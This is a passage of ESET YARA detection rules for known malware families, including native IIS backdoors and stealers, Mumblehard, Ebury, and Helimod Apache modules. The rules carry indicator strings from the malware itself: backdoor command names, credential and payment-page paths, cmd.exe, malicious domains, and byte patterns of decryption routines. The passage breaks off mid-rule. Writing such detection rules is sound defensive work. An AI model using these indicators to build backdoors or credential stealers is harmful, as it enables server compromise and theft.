		pe.rich_signature.toolid( 259 , 30818 ) == 9 and pe.rich_signature.toolid ( 256 , 31329 ) == 1 and pe.rich_signature.toolid ( 261 , 30818 ) >= 30 and pe.rich_signature.toolid ( 261 , 30818 ) <= 38 and pe.rich_signature.toolid ( 261 , 29395 ) >= 134 and pe.rich_signature.toolid ( 261 , 29395 ) <= 164 and pe.rich_signature.toolid ( 257 , 29395 ) >= 6 and pe.rich_signature.toolid ( 257 , 29395 ) <= 14
}

rule ESET_Mumblehard_Packer
{
	meta:
		description = "Mumblehard i386 assembly code responsible for decrypting Perl code"
		author = "Marc-Etienne M.Léveillé"
		id = "981c18e3-ac28-54f5-97ab-44b1d12a1389"
		date = "2015-04-07"
		modified = "2015-05-01"
		reference = "http://www.welivesecurity.com"
		source_url = "https://github.com/eset/malware-ioc/blob/eeab168d4cd6bac7c5bd06defb3d7198bd58f37f/mumblehard/mumblehard_packer.yar#L32-L47"
		license_url = "https://github.com/eset/malware-ioc/blob/eeab168d4cd6bac7c5bd06defb3d7198bd58f37f/LICENSE"
		logic_hash = "a04f50a7054c4ce8ad9be4e7f3373ad4f36eb9443e223601974e852c25603f5f"
		score = 75
		quality = 80
		tags = ""
		version = "1"

	strings:
		$decrypt = { 31 db  [1-10]  ba ?? 00 00 00  [0-6]  (56 5f |  89 F7)
                     39 d3 75 13 81 fa ?? 00 00 00 75 02 31 d2 81 c2 ?? 00 00
                     00 31 db 43 ac 30 d8 aa 43 e2 e2 }

	condition:
		$decrypt
}

rule ESET_IIS_Group02
{
	meta:
		description = "Detects Group 2 native IIS malware family"
		author = "ESET Research"
		id = "945e3748-1072-55f3-abaa-903dfc250294"
		date = "2021-08-04"
		modified = "2021-08-04"
		reference = "https://github.com/eset/malware-ioc/"
		source_url = "https://github.com/eset/malware-ioc/blob/eeab168d4cd6bac7c5bd06defb3d7198bd58f37f/badiis/badiis.yar#L134-L155"
		license_url = "https://github.com/eset/malware-ioc/blob/eeab168d4cd6bac7c5bd06defb3d7198bd58f37f/LICENSE"
		logic_hash = "3fa2b8fed3c580f446b55412a920a5cfed2317b06aa93d059e9f89fdbec8f683"
		score = 75
		quality = 76
		tags = ""
		license = "BSD 2-Clause"
		version = "1"

	strings:
		$s1 = "HttpModule.pdb" ascii wide
		$s2 = "([\\w+%]+)=([^&]*)"
		$s3 = "([\\w+%]+)=([^!]*)"
		$s4 = "cmd.exe"
		$s5 = "C:\\Users\\Iso\\Documents\\Visual Studio 2013\\Projects\\IIS 5\\x64\\Release\\Vi.pdb" ascii wide
		$s6 = "AVRSAFunction"

	condition:
		ESET_IIS_Native_Module_PRIVATE and 3 of ( $s* )
}

rule ESET_IIS_Group03
{
	meta:
		description = "Detects Group 3 native IIS malware family"
		author = "ESET Research"
		id = "9caf9b3e-611e-5e0e-a7ee-9e7515679022"
		date = "2021-08-04"
		modified = "2021-08-04"
		reference = "https://github.com/eset/malware-ioc/"
		source_url = "https://github.com/eset/malware-ioc/blob/eeab168d4cd6bac7c5bd06defb3d7198bd58f37f/badiis/badiis.yar#L157-L176"
		license_url = "https://github.com/eset/malware-ioc/blob/eeab168d4cd6bac7c5bd06defb3d7198bd58f37f/LICENSE"
		logic_hash = "d811c2ac610780bf968e86e8fd302cffc9434902e547399d06fdeb30d1719f51"
		score = 75
		quality = 80
		tags = ""
		license = "BSD 2-Clause"
		version = "1"

	strings:
		$s1 = "IIS-Backdoor.dll"
		$s2 = "CryptStringToBinaryA"
		$s3 = "CreateProcessA"
		$s4 = "X-Cookie"

	condition:
		ESET_IIS_Native_Module_PRIVATE and 3 of ( $s* )
}

rule ESET_IIS_Group04_Rgdoor
{
	meta:
		description = "Detects Group 4 native IIS malware family (RGDoor)"
		author = "ESET Research"
		id = "64a0e664-a4d9-555b-a11b-5f7d9d0678b1"
		date = "2021-08-04"
		modified = "2021-08-04"
		reference = "https://github.com/eset/malware-ioc/"
		source_url = "https://github.com/eset/malware-ioc/blob/eeab168d4cd6bac7c5bd06defb3d7198bd58f37f/badiis/badiis.yar#L178-L199"
		license_url = "https://github.com/eset/malware-ioc/blob/eeab168d4cd6bac7c5bd06defb3d7198bd58f37f/LICENSE"
		logic_hash = "be615dc0cc8bf0fd52cc5a88a3759c1cb1cd18703de74d16f5cce3eabccf91c6"
		score = 75
		quality = 80
		tags = ""
		license = "BSD 2-Clause"
		version = "1"

	strings:
		$i1 = "RGSESSIONID="
		$s2 = "upload$"
		$s3 = "download$"
		$s4 = "cmd$"
		$s5 = "cmd.exe"

	condition:
		ESET_IIS_Native_Module_PRIVATE and ( $i1 or all of ( $s* ) )
}

rule ESET_IIS_Group05_Iistealer
{
	meta:
		description = "Detects Group 5 native IIS malware family (IIStealer)"
		author = "ESET Research"
		id = "598ec6b2-0349-5da7-acad-72ef2468b927"
		date = "2021-08-04"
		modified = "2021-08-04"
		reference = "https://github.com/eset/malware-ioc/"
		source_url = "https://github.com/eset/malware-ioc/blob/eeab168d4cd6bac7c5bd06defb3d7198bd58f37f/badiis/badiis.yar#L201-L232"
		license_url = "https://github.com/eset/malware-ioc/blob/eeab168d4cd6bac7c5bd06defb3d7198bd58f37f/LICENSE"
		logic_hash = "5dff445121fda59df805d6fcb5db3f8f8e52a6e63e2da2a6875f8c9ad9cafc72"
		score = 75
		quality = 80
		tags = ""
		license = "BSD 2-Clause"
		version = "1"

	strings:
		$s1 = "tojLrGzFMbcDTKcH" ascii wide
		$s2 = "4vUOj3IutgtrpVwh" ascii wide
		$s3 = "SoUnRCxgREXMu9bM" ascii wide
		$s4 = "9Zr1Z78OkgaXj1Xr" ascii wide
		$s5 = "cache.txt" ascii wide
		$s6 = "/checkout/checkout.aspx" ascii wide
		$s7 = "/checkout/Payment.aspx" ascii wide
		$s8 = "/privacy.aspx"
		$s9 = "X-IIS-Data"
		$s10 = "POST"
		$s11 = {C7 ?? CF 2F 00 63 00 C7 ?? D3 68 00 65 00 C7 ?? D7 63 00 6B 00 C7 ?? DB 6F 00 75 00 C7 ?? DF 74 00 2F 00 C7 ?? E3 63 00 68 00 C7 ?? E7 65 00 63 00 C7 ?? EB 6B 00 6F 00 C7 ?? EF 75 00 74 00 C7 ?? F3 2E 00 61 00 C7 ?? F7 73 00 70 00 C7 ?? FB 78 00 00 00}
		$s12 = {C7 ?? AF 2F 00 70 00 C7 ?? B3 72 00 69 00 C7 ?? B7 76 00 61 00 C7 ?? BB 63 00 79 00 C7 ?? BF 2E 00 61 00 C7 ?? C3 73 00 70 00 C7 ?? C7 78 00 00 00}

	condition:
		ESET_IIS_Native_Module_PRIVATE and 3 of ( $s* )
}

rule ESET_IIS_Group06_ISN
{
	meta:
		description = "Detects Group 6 native IIS malware family (ISN)"
		author = "ESET Research"
		id = "1f68fc42-61a3-5a7d-9daa-31ae3b561837"
		date = "2021-08-04"
		modified = "2021-08-04"
		reference = "https://github.com/eset/malware-ioc/"
		source_url = "https://github.com/eset/malware-ioc/blob/eeab168d4cd6bac7c5bd06defb3d7198bd58f37f/badiis/badiis.yar#L234-L259"
		license_url = "https://github.com/eset/malware-ioc/blob/eeab168d4cd6bac7c5bd06defb3d7198bd58f37f/LICENSE"
		logic_hash = "2f59034a642a9b92fc88922433cd5923be02332159cba5e16d99d9523ed43205"
		score = 75
		quality = 80
		tags = ""
		license = "BSD 2-Clause"
		version = "1"

	strings:
		$s1 = "isn7 config reloaded"
		$s2 = "isn7 config NOT reloaded, not found or empty"
		$s3 = "isn7 log deleted"
		$s4 = "isn7 log not deleted, ERROR 0x%X"
		$s5 = "isn7 log NOT found"
		$s6 = "isn_reloadconfig"
		$s7 = "D:\\soft\\Programming\\C++\\projects\\isapi\\isn7"
		$s8 = "get POST failed %d"
		$s9 = "isn7.dll"

	condition:
		ESET_IIS_Native_Module_PRIVATE and 3 of ( $s* )
}

rule ESET_IIS_Group07_Iispy
{
	meta:
		description = "Detects Group 7 native IIS malware family (IISpy)"
		author = "ESET Research"
		id = "64ed0189-a0be-5592-b9c6-1622700a7ed7"
		date = "2021-08-04"
		modified = "2021-08-04"
		reference = "https://github.com/eset/malware-ioc/"
		source_url = "https://github.com/eset/malware-ioc/blob/eeab168d4cd6bac7c5bd06defb3d7198bd58f37f/badiis/badiis.yar#L261-L296"
		license_url = "https://github.com/eset/malware-ioc/blob/eeab168d4cd6bac7c5bd06defb3d7198bd58f37f/LICENSE"
		logic_hash = "ec5db5f36d06f9b0bdfe598fc72431da35afc1473dcc29f437a0f48ea9835a03"
		score = 75
		quality = 80
		tags = ""
		license = "BSD 2-Clause"
		version = "1"

	strings:
		$s1 = "/credential/username"
		$s2 = "/credential/password"
		$s3 = "/computer/domain"
		$s4 = "/computer/name"
		$s5 = "/password"
		$s6 = "/cmd"
		$s7 = "%.8s%.8s=%.8s%.16s%.8s%.16s"
		$s8 = "ImpersonateLoggedOnUser"
		$s9 = "WNetAddConnection2W"
		$t1 = "X-Forwarded-Proto"
		$t2 = "Sec-Fetch-Mode"
		$t3 = "Sec-Fetch-Site"
		$t4 = "Cookie"
		$t5 = {49 45 4E 44 AE 42 60 82}
		$t6 = {89 50 4E 47 0D 0A 1A 0A 00 00 00 0D 49 48 44 52}

	condition:
		ESET_IIS_Native_Module_PRIVATE and 2 of ( $s* ) and any of ( $t* )
}

rule ESET_IIS_Group08
{
	meta:
		description = "Detects Group 8 native IIS malware family"
		author = "ESET Research"
		id = "d0e9a5ec-b7f0-5d3f-93b4-d048503eb210"
		date = "2021-08-04"
		modified = "2021-08-04"
		reference = "https://github.com/eset/malware-ioc/"
		source_url = "https://github.com/eset/malware-ioc/blob/eeab168d4cd6bac7c5bd06defb3d7198bd58f37f/badiis/badiis.yar#L298-L337"
		license_url = "https://github.com/eset/malware-ioc/blob/eeab168d4cd6bac7c5bd06defb3d7198bd58f37f/LICENSE"
		logic_hash = "d5826d454d25ecbbb5da464da974023a247517d873cf10dc0eafa91e185451da"
		score = 75
		quality = 53
		tags = ""
		license = "BSD 2-Clause"
		version = "1"

	strings:
		$i1 = "FliterSecurity.dll"
		$i2 = "IIS7NativeModule.dll"
		$i3 = "Ver1.0."
		$s1 = "Cmd"
		$s2 = "Realy path : %s"
		$s3 = "Logged On Users : %d"
		$s4 = "Connect OK!"
		$s5 = "You are fucked!"
		$s6 = "Shit!Error"
		$s7 = "Where is the God!!"
		$s8 = "Shit!Download False!"
		$s9 = "Good!Run OK!"
		$s10 = "Shit!Run False!"
		$s11 = "Good!Download OK!"
		$s12 = "[%d]safedog"
		$s13 = "ed81bfc09d069121"
		$s14 = "a9478ef01967d190"
		$s15 = "af964b7479e5aea2"
		$s16 = "1f9e6526bea65b59"
		$s17 = "2b9e9de34f782d31"
		$s18 = "33cc5da72ac9d7bb"
		$s19 = "b1d71f4c2596cd55"
		$s20 = "101fb9d9e86d9e6c"

	condition:
		ESET_IIS_Native_Module_PRIVATE and 1 of ( $i* ) and 3 of ( $s* )
}

rule ESET_IIS_Group09
{
	meta:
		description = "Detects Group 9 native IIS malware family"
		author = "ESET Research"
		id = "69d176bc-73b1-5c4d-bb7e-463d26e8e6a9"
		date = "2021-08-04"
		modified = "2021-08-04"
		reference = "https://github.com/eset/malware-ioc/"
		source_url = "https://github.com/eset/malware-ioc/blob/eeab168d4cd6bac7c5bd06defb3d7198bd58f37f/badiis/badiis.yar#L339-L387"
		license_url = "https://github.com/eset/malware-ioc/blob/eeab168d4cd6bac7c5bd06defb3d7198bd58f37f/LICENSE"
		logic_hash = "5f89f9488221b8db8d493b3c23b7f5edd957c15511148eca890558886c128192"
		score = 75
		quality = 76
		tags = ""
		license = "BSD 2-Clause"
		version = "1"

	strings:
		$i1 = "FliterSecurity.dll"
		$i2 = {56565656565656565656565656565656}
		$i3 = "app|hot|alp|svf|fkj|mry|poc|doc|20" xor
		$i4 = "yisouspider|yisou|soso|sogou|m.sogou|sogo|sogou|so.com|baidu|bing|360" xor
		$i5 = "baidu|m.baidu|soso|sogou|m.sogou|sogo|sogou|so.com|google|youdao" xor
		$i6 = "118|abc|1go|evk" xor
		$s1 = "AVCFuckHttpModuleFactory"
		$s2 = "X-Forward"
		$s3 = "fuck32.dat"
		$s4 = "fuck64.dat"
		$s5 = "&ipzz1="
		$s6 = "&ipzz2="
		$s7 = "&uuu="
		$s8 = "http://20.3323sf.c" xor
		$s9 = "http://bj.whtjz.c" xor
		$s10 = "http://bj2.wzrpx.c" xor
		$s11 = "http://cs.whtjz.c" xor
		$s12 = "http://df.e652.c" xor
		$s13 = "http://dfcp.yyphw.c" xor
		$s14 = "http://es.csdsx.c" xor
		$s15 = "http://hz.wzrpx.c" xor
		$s16 = "http://id.3323sf.c" xor
		$s17 = "http://qp.008php.c" xor
		$s18 = "http://qp.nmnsw.c" xor
		$s19 = "http://sc.300bt.c" xor
		$s20 = "http://sc.wzrpx.c" xor
		$s21 = "http://sf2223.c" xor
		$s22 = "http://sx.cmdxb.c" xor
		$s23 = "http://sz.ycfhx.c" xor
		$s24 = "http://xpq.0660sf.c" xor
		$s25 = "http://xsc.b1174.c" xor

	condition:
		ESET_IIS_Native_Module_PRIVATE and any of ( $i* ) and 3 of ( $s* )
}

rule ESET_IIS_Group10
{
	meta:
		description = "Detects Group 10 native IIS malware family"
		author = "ESET Research"
		id = "31368b38-9128-594d-888d-e97d3edc7a1f"
		date = "2021-08-04"
		modified = "2021-08-04"
		reference = "https://github.com/eset/malware-ioc/"
		source_url = "https://github.com/eset/malware-ioc/blob/eeab168d4cd6bac7c5bd06defb3d7198bd58f37f/badiis/badiis.yar#L389-L423"
		license_url = "https://github.com/eset/malware-ioc/blob/eeab168d4cd6bac7c5bd06defb3d7198bd58f37f/LICENSE"
		logic_hash = "48701168d7da726222227ef757f1a4005a49c0bf300123319ce03db09445b3ef"
		score = 75
		quality = 80
		tags = ""
		license = "BSD 2-Clause"
		version = "1"

	strings:
		$s1 = "IIS7.dll"
		$s2 = "<title>(.*?)title(.*?)>"
		$s3 = "<meta(.*?)name(.*?)=(.*?)keywords(.*?)>"
		$s4 = "<meta(.*?)name(.*?)=(.*?)description(.*?)>"
		$s5 = "js.breakavs.co"
		$s6 = "&#24494;&#20449;&#32676;&#45;&#36187;&#36710;&#80;&#75;&#49;&#48;&#32676;&#12304;&#36827;&#32676;&#24494;&#20449;&#102;&#117;&#110;&#53;&#55;&#54;&#52;&#52;&#12305;&#95;&#24184;&#36816;&#39134;&#33351;&#95;&#24184;&#36816;&#50;&#56;&#32676;"
		$s7 = "&#21271;&#20140;&#36187;&#36710;&#24494;&#20449;&#32676;&#44;&#21271;&#20140;&#24494;&#20449;&#36187;&#36710;&#32676;&#44;&#21271;&#20140;&#36187;&#36710;&#24494;&#20449;&#32676;&#44;&#80;&#75;&#49;&#48;&#32676;&#44;&#21271;&#20140;&#36187;&#36710;&#112;&#107;&#49;&#48;&#24494;&#20449;&#32676;&#44;&#80;&#75;&#49;&#48;&#24494;&#20449;&#32676;&#44;&#36187;&#36710;&#24494;&#20449;&#32676;&#44;&#21271;&#20140;&#36187;&#36710;&#32676;&#44;"
		$s8 = "&#21271;&#20140;&#36187;&#36710;&#24494;&#20449;&#32676;&#44;&#21271;&#20140;&#24494;&#20449;&#36187;&#36710;&#32676;&#12304;&#36827;&#32676;&#24494;&#20449;&#21495;&#102;&#117;&#110;&#53;&#55;&#54;&#52;&#52;&#12305;&#21271;&#20140;&#24494;&#20449;&#36187;&#36710;&#32676;&#44;&#21271;&#20140;&#24494;&#20449;&#36187;&#36710;"
		$e1 = "Baiduspider"
		$e2 = "Sosospider"
		$e3 = "Sogou web spider"
		$e4 = "360Spider"
		$e5 = "YisouSpider"
		$e6 = "sogou.com"
		$e7 = "soso.com"
		$e8 = "uc.cn"
		$e9 = "baidu.com"
		$e10 = "sm.cn"

	condition:
		ESET_IIS_Native_Module_PRIVATE and 2 of ( $e* ) and 3 of ( $s* )
}

rule ESET_IIS_Group11
{
	meta:
		description = "Detects Group 11 native IIS malware family"
		author = "ESET Research"
		id = "e9dac67a-1675-5198-ad26-d555696844f9"
		date = "2021-08-04"
		modified = "2021-08-04"
		reference = "https://github.com/eset/malware-ioc/"
		source_url = "https://github.com/eset/malware-ioc/blob/eeab168d4cd6bac7c5bd06defb3d7198bd58f37f/badiis/badiis.yar#L425-L455"
		license_url = "https://github.com/eset/malware-ioc/blob/eeab168d4cd6bac7c5bd06defb3d7198bd58f37f/LICENSE"
		logic_hash = "a67b6b49b5fc2c7f260c06201c59478f5472de63091c510af82d526c410abb0c"
		score = 75
		quality = 80
		tags = ""
		license = "BSD 2-Clause"
		version = "1"

	strings:
		$s1 = "DnsQuery_A"
		$s2 = "&reurl="
		$s3 = "&jump=1"
		$s4 = "JVVRaeof"
		$s5 = "ncpmg::0"
		$s6 = "zkpzz0cnnuqwnw0eqo"
		$s7 = "jvvr<11yyy0cnnuqwnw0eqo130rjrAeofqwv?"

	condition:
		ESET_IIS_Native_Module_PRIVATE and 3 of ( $s* )
}

rule ESET_IIS_Group12
{
	meta:
		description = "Detects Group 12 native IIS malware family"
		author = "ESET Research"
		id = "7278f2df-d18a-5d95-9c21-37906629a7f0"
		date = "2021-08-04"
		modified = "2021-08-04"
		reference = "https://github.com/eset/malware-ioc/"
		source_url = "https://github.com/eset/malware-ioc/blob/eeab168d4cd6bac7c5bd06defb3d7198bd58f37f/badiis/badiis.yar#L457-L495"
		license_url = "https://github.com/eset/malware-ioc/blob/eeab168d4cd6bac7c5bd06defb3d7198bd58f37f/LICENSE"
		logic_hash = "8da03328e3702aff8ea5de77fc220f326030c31972d27c0bd9b5918dca550aba"
		score = 75
		quality = 78
		tags = ""
		license = "BSD 2-Clause"
		version = "1"

	strings:
		$s1 = "C:\\inetpub\\temp\\IIS Temporary Compressed Files\\"
		$s2 = "F5XFFHttpModule.dll"
		$s3 = "gtest_redir"
		$s4 = "\\cmd.exe" nocase
		$s5 = "iuuq;00"
		$s6 = "?xhost="
		$s7 = "&reurl="
		$s8 = "?jump=1"
		$s9 = "app|zqb"
		$s10 = "ifeng|ivc|sogou|so.com|baidu|google|youdao|yahoo|bing|118114|biso|gougou|sooule|360|sm|uc"
		$s11 = "sogou|so.com|baidu|google|youdao|yahoo|bing|gougou|sooule|360|sm.cn|uc"
		$s12 = "Hotcss/|Hotjs/"
		$s13 = "HotImg/|HotPic/"
		$s14 = "msf connect error !!"
		$s15 = "download ok !!"
		$s16 = "download error !! "
		$s17 = "param error !!"
		$s18 = "Real Path: "
		$s19 = "unknown cmd !"
		$b1 = {15 BD 01 2E [-] 5E 40 08 97 [-] CF 8C BE 30 [-] 28 42 C6 3B}
		$b2 = {E1 0A DC 39 [-] 49 BA 59 AB [-] BE 56 E0 57 [-] F2 0F 88 3E}

	condition:
		ESET_IIS_Native_Module_PRIVATE and 5 of them
}

rule ESET_IIS_Group13_Iiserpent
{
	meta:
		description = "Detects Group 13 native IIS malware family (IISerpent)"
		author = "ESET Research"
		id = "f22dffb1-466f-5a7b-b9aa-de7ba991db1a"
		date = "2021-08-04"
		modified = "2021-08-04"
		reference = "https://github.com/eset/malware-ioc/"
		source_url = "https://github.com/eset/malware-ioc/blob/eeab168d4cd6bac7c5bd06defb3d7198bd58f37f/badiis/badiis.yar#L497-L523"
		license_url = "https://github.com/eset/malware-ioc/blob/eeab168d4cd6bac7c5bd06defb3d7198bd58f37f/LICENSE"
		logic_hash = "7077b842c53ee1581ad4150cdfaac3502bfc0fbd3b823190ad648e09f36e442d"
		score = 75
		quality = 80
		tags = ""
		license = "BSD 2-Clause"
		version = "1"

	strings:
		$s1 = "/mconfig/lunlian.txt"
		$s2 = "http://sb.qrfy.ne"
		$s3 = "folderlinkpath"
		$s4 = "folderlinkcount"
		$s5 = "onlymobilespider"
		$s6 = "redirectreferer"
		$s7 = "loadSuccessfull : "
		$s8 = "spider"
		$s9 = "<a href="
		$s11 = "?ReloadModuleConfig=1"
		$s12 = "?DisplayModuleConfig=1"

	condition:
		ESET_IIS_Native_Module_PRIVATE and 5 of them
}

rule ESET_IIS_Group14
{
	meta:
		description = "Detects Group 14 native IIS malware family"
		author = "ESET Research"
		id = "c773b09e-9f24-5e75-ba80-4be69af70b06"
		date = "2021-08-04"
		modified = "2021-08-04"
		reference = "https://github.com/eset/malware-ioc/"
		source_url = "https://github.com/eset/malware-ioc/blob/eeab168d4cd6bac7c5bd06defb3d7198bd58f37f/badiis/badiis.yar#L525-L552"
		license_url = "https://github.com/eset/malware-ioc/blob/eeab168d4cd6bac7c5bd06defb3d7198bd58f37f/LICENSE"
		logic_hash = "ef10a4dfb1a9164533677416a7c9ada715ce10bfc1e5f92b56cf54bd890d4575"
		score = 75
		quality = 80
		tags = ""
		license = "BSD 2-Clause"
		version = "1"

	strings:
		$i1 = "agent-self: %s"
		$i2 = "/utf.php?key="
		$i3 = "/self.php?v="
		$i4 = "<script type=\"text/javascript\" src=\"//speed.wlaspsd.co"
		$i5 = "now.asmkpo.co"
		$s1 = "Baiduspider"
		$s2 = "360Spider"
		$s3 = "Sogou"
		$s4 = "YisouSpider"
		$s6 = "HTTP_X_FORWARDED_FOR"

	condition:
		ESET_IIS_Native_Module_PRIVATE and 2 of ( $i* ) or 5 of them
}

rule ESET_Potao
{
	meta:
		description = "No description has been set in the source file - ESET"
		author = "ESET TI"
		id = "9c755cb8-9e3f-5118-a8e0-4ded9a075cbd"
		date = "2015-07-29"
		modified = "2015-07-30"
		reference = "https://github.com/eset/malware-ioc/"
		source_url = "https://github.com/eset/malware-ioc/blob/eeab168d4cd6bac7c5bd06defb3d7198bd58f37f/potao/PotaoNew.yara#L96-L108"
		license_url = "https://github.com/eset/malware-ioc/blob/eeab168d4cd6bac7c5bd06defb3d7198bd58f37f/LICENSE"
		logic_hash = "c68addb14f7c22cec0c4d58bfffd373b2e3eb5c53a5b65532c84574e073fcbba"
		score = 75
		quality = 80
		tags = ""
		Author = "Anton Cherepanov"
		Description = "Operation Potao"
		Contact = "threatintel@eset.com"
		License = "BSD 2-Clause"

	condition:
		ESET_Potaodecoy_PRIVATE or ESET_Potaodll_PRIVATE or ESET_Potaousb_PRIVATE or ESET_Potaosecondstage_PRIVATE
}

rule ESET_Libkeyutils_With_Ctor
{
	meta:
		description = "This rule detects if a libkeyutils.so shared library has a potentially malicious function to be called when loaded, either via a glibc constructor (DT_INIT + .ctors) or an initializer function in DT_INIT_ARRAY."
		author = "ESET, spol. s r.o."
		id = "7b466bf7-f895-569d-99b0-eca95a6ebc83"
		date = "2024-02-01"
		modified = "2024-04-29"
		reference = "https://github.com/eset/malware-ioc/"
		source_url = "https://github.com/eset/malware-ioc/blob/eeab168d4cd6bac7c5bd06defb3d7198bd58f37f/windigo/ebury.yar#L3-L54"
		license_url = "https://github.com/eset/malware-ioc/blob/eeab168d4cd6bac7c5bd06defb3d7198bd58f37f/LICENSE"
		hash = "e7debd6e453192ad8376db5bab03ed0d87566591"
		logic_hash = "c6172aebc67a05fb044b0450aafcc71c7d1fd2831985587d1a9ad53f59e14214"
		score = 75
		quality = 80
		tags = ""
		license = "BSD 2-Clause"
		version = 2

	strings:
		$libname = "libkeyutils.so.1"

	condition:
		for any ptr_size in ( 4 , 8 ) : ( ( ( ptr_size == 4 and elf.machine == elf.EM_386 ) or ( ptr_size == 8 and elf.machine == elf.EM_X86_64 ) ) and for any d in elf.dynamic : ( d.type == elf.DT_SONAME and ( for any s in elf.sections : ( s.name == ".dynstr" and $libname at ( s.offset + d.val ) ) or for any s in elf.dynamic : ( s.type == elf.DT_STRTAB and $libname at ( s.val + d.val ) ) ) ) and ( for any s in elf.sections : ( s.name == ".ctors" and s.size > 2 * ptr_size ) or for any d in elf.dynamic : ( d.type == elf.DT_INIT_ARRAYSZ and d.val > ptr_size ) ) )
}

rule ESET_Ebury_V1_7_Crypto
{
	meta:
		description = "This rule detects the strings decryption routine in Ebury v1.7 and v1.8"
		author = "ESET, spol. s r.o."
		id = "93dadf5f-b572-5217-8c82-4957c6d24955"
		date = "2023-08-01"
		modified = "2024-04-29"
		reference = "https://github.com/eset/malware-ioc/"
		source_url = "https://github.com/eset/malware-ioc/blob/eeab168d4cd6bac7c5bd06defb3d7198bd58f37f/windigo/ebury.yar#L56-L97"
		license_url = "https://github.com/eset/malware-ioc/blob/eeab168d4cd6bac7c5bd06defb3d7198bd58f37f/LICENSE"
		hash = "e7debd6e453192ad8376db5bab03ed0d87566591"
		logic_hash = "41908951069a472d7528f2f228f3681f008d16a0436e341d339909efc4933e66"
		score = 75
		quality = 80
		tags = ""
		license = "BSD 2-Clause"
		version = 1

	strings:
		$64 = {
            48 69 ( 9C 24 ?? ?? ?? ?? | 5C 24 ?? | D2) 6D 4E C6 41 //  imul    rbx, [rsp+_buf], 41C64E6Dh
            8B (0C 16 | 34 07)                      //  mov     ecx, [rsi+rdx]
            48 81 C? 39 30 00 00                    //  add     rbx, 12345
            ( 31 D? |                               //  xor     ecx, ebx
              31 D? 48 89 9C 24 ?? ?? ?? ?? |       //  mov     [rsp+_buf], rbx
              31 D? 48 89 5C 24 ?? )                //  ^ optional
            89 (0C 10 | 34 01)                      //  mov     [rax+rdx], ecx
            48 83 C? 04                             //  add     rdx, 4
            48 (81 FA | 3D ) ?? ?? ?? ??            //  cmp     rdx, _size
            75 D?                                   //  jnz     short _begin
        }
		$32 = {
            69 C9 6D 4E C6 41      // imul    ecx, 41C64E6Dh
            8B B4 1A ?? ?? ?? ??   // mov     esi, [edx+ebx+_data]
            81 C1 39 30 00 00      // add     ecx, 12345
            31 CE                  // xor     esi, ecx
            89 34 10               // mov     [eax+edx], esi
            83 C2 04               // add     edx, 4
            81 FA ?? ?? ?? ??      // cmp     edx, _size
            75 DD                  // jnz     short loc_69A5
        }

	condition:
		any of them
}

rule ESET_Helimodproxy
{
	meta:
		description = "HelimodProxy malicious Apache module"
		author = "ESET, spol. s r.o."
		id = "8c05bd0b-9645-580c-ac80-58e45b2a8884"
		date = "2024-04-27"
		modified = "2024-04-27"
		reference = "https://github.com/eset/malware-ioc/"
		source_url = "https://github.com/eset/malware-ioc/blob/eeab168d4cd6bac7c5bd06defb3d7198bd58f37f/windigo/helimod.yar#L32-L54"
		license_url = "https://github.com/eset/malware-ioc/blob/eeab168d4cd6bac7c5bd06defb3d7198bd58f37f/LICENSE"
		hash = "e39667aa137e315bc26eaef791ccab52938fd809"
		logic_hash = "9e3d57add1042eff41b42f0c8d46ed37af4092d5af4d4b2088b07992a4649bc2"
		score = 75
		quality = 80
		tags = ""
		license = "BSD 2-Clause"
		version = 1

	strings:
		$1 = "secret\x00%s:%u"
		$2 = "/%s/%s/%s%s"
		$3 = "ad\x00pmt"
		$4 = "mod_dir.c"
		$5 = "pmtad"

	condition:
		ESET_Apachemodule_PRIVATE and ( $1 or ( $2 and $3 ) or ( $4 and $5 ) )
}

rule ESET_Helimodredirect
{
	meta:
		description = "HelimodRedirect malicious Apache module"
		author = "ESET, spol. s r.o."
		id = "d8fe674d-8895-5501-b2e3-f74c386e10f0"
		date = "2024-04-27"
		modified = "2024-04-27"
		reference = "https://github.com/eset/malware-ioc/"
		source_url = "https://github.com/eset/malware-ioc/blob/eeab168d4cd6bac7c5bd06defb3d7198bd58f37f/windigo/helimod.yar#L56-L79"
		license_url = "https://github.com/eset/malware-ioc/blob/eeab168d4cd6bac7c5bd06defb3d7198bd58f37f/LICENSE"
		hash = "e39667aa137e315bc26eaef791ccab52938fd809"
		logic_hash = "1a85cae7ee354e5d96e88781b4e0a49757016d8b64dfb80c07a13b36bf9091e2"
		score = 75
		quality = 80
		tags = ""
		license = "BSD 2-Clause"
		version = 1

	strings:
		$h1 = "secret\x00%s:%"
		$h2 = "$!%#!$"
		$h3 = "mod_security2.c"
		$r1 = "%s?DOM=%s&URI=%s"
		$r2 = "REDIRECT_URL"

	condition:
		ESET_Apachemodule_PRIVATE and any of ( $h* ) and any of ( $r* )
}

rule ESET_Helimodsteal
{
	meta:
		description = "HelimodSteal malicious Apache module"
		author = "ESET, spol. s r.o."
		id = "7b080f21-d6e3-5dda-bfd9-fb9d82fbb98e"
		date = "2024-04-27"
		modified = "2024-04-27"
		reference = "https://github.com/eset/malware-ioc/"
		source_url = "https://github.com/eset/malware-ioc/blob/eeab168d4cd6bac7c5bd06defb3d7198bd58f37f/windigo/helimod.yar#L81-L105"
		license_url = "https://github.com/eset/malware-ioc/blob/eeab168d4cd6bac7c5bd06defb3d7198bd58f37f/LICENSE"
		hash = "e39667aa137e315bc26eaef791ccab52938fd809"
		logic_hash = "9c0a5842dc986fec667fc7d7ad9d0c63b89b4a5ec87c9c9b72574ca5b15df928"
		score = 75
		quality = 80
		tags = ""
		license = "BSD 2-Clause"
		version = 2

	strings:
		$h1 = "secret\x00%s:%"
		$h2 = "$!%#!$"
		$h3 = "mod_security2.c"
		$s1 = "p0sT5n1F3r"
		$s2 = "ENGINE_ON"
		$s3 = "POST /"

	condition:
		ESET_Apachemodule_PRIVATE and any of ( $h* ) and any of ( $s* )
}

rule ESET_Dino
{
	meta:
		description = "No description has been set in the source file - ESET"
		author = "ESET TI"
		id = "77d0a039-f60c-59ea-bad6-5b4b630007bb"
		date = "2015-07-14"
		modified = "2015-08-17"
		reference = "https://github.com/eset/malware-ioc/"
		source_url = "https://github.com/eset/malware-ioc/blob/eeab168d4cd6bac7c5bd06defb3d7198bd58f37f/animalfarm/animalfarm.yar#L73-L96"
		license_url = "https://github.com/eset/malware-ioc/blob/eeab168d4cd6bac7c5bd06defb3d7198bd58f37f/LICENSE"
		logic_hash = "898e527eb8b05050135dee7cbe974100710a1a3a6a5cb8eb03563ee1c0aca01f"
		score = 75
		quality = 80
		tags = ""
		Author = "Joan Calvet"
		Description = "Dino backdoor"
		Contact = "github@eset.com"
		License = "BSD 2-Clause"

	strings:
